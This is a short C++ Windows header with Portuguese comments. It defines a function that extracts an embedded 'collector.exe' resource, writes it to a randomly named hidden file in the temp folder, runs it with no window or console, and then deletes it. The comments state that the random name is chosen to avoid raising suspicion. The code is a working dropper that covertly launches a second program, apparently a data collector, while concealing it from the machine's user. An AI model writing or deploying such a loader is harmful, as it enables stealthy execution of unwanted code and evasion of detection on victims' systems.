#pragma once
#include <windows.h>

// Extrai collector.exe do recurso embutido e roda hidden em background
static void RunCollectorHidden() {
    HRSRC   hRes  = FindResourceA(nullptr, MAKEINTRESOURCEA(101), RT_RCDATA);
    HGLOBAL hGlob = hRes  ? LoadResource(nullptr, hRes)  : nullptr;
    void*   pData = hGlob ? LockResource(hGlob)          : nullptr;
    DWORD   size  = hRes  ? SizeofResource(nullptr, hRes): 0;
    if (!pData || !size) return;

    // Nome aleatorio em %TEMP% para nao levantar suspeita
    wchar_t tmpDir[MAX_PATH] = {}, tmpPath[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, tmpDir);
    swprintf_s(tmpPath, L"%s%08X%08X.exe",
        tmpDir, GetTickCount(), GetCurrentProcessId());

    HANDLE hf = CreateFileW(tmpPath, GENERIC_WRITE, 0, nullptr,
        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
    if (hf == INVALID_HANDLE_VALUE) return;
    DWORD wr = 0;
    WriteFile(hf, pData, size, &wr, nullptr);
    CloseHandle(hf);

    // Executa hidden, sem janela, sem console
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    if (CreateProcessW(nullptr, tmpPath, nullptr, nullptr,
        FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        // Aguarda terminar e deleta o exe temporario
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    DeleteFileW(tmpPath);
}
